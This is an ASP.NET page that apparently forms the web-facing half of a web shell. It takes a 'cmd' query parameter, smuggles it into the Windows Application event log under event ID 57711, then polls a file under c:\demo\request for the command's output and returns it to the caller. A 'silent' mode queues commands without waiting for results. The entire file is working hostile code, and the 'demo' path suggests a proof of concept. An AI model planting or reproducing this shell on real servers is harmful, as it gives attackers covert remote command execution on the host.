<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Page Language="c#" debug="true" %>
<%
Response.ContentType = "text/plain";
var id = HttpUtility.ParseQueryString(Request.Url.Query).Get("id");
var silent = HttpUtility.ParseQueryString(Request.Url.Query).Get("silent");
if (String.IsNullOrEmpty(id)) {
  using (EventLog eventLog = new EventLog("Application")) 
  {
    eventLog.Source = "Application";
    if (silent != null && silent.ToLower() == "yes") {
      var cmd = HttpUtility.ParseQueryString(Request.Url.Query).Get("cmd");
      eventLog.WriteEntry(Request.Url.Query, EventLogEntryType.Information, 57711, 1);
      Response.Write("Request queued " + cmd);
    } else {
      id = Guid.NewGuid().ToString();
      eventLog.WriteEntry(id + Request.Url.Query, EventLogEntryType.Information, 57711, 1);
      System.Threading.Thread.Sleep(2000);
      Response.Redirect(Request.Url+"&id="+id);
    }
  }
} else {
  var filename = string.Format(@"c:\demo\request\{0}.txt", id);
  var running = true;
  while (running) { 
    try {
      if (System.IO.File.Exists(filename)) {
        Response.Write(System.IO.File.ReadAllText(filename));
        running = false;
      }
    } catch {
    }
    System.Threading.Thread.Sleep(1000);
  }
}
%>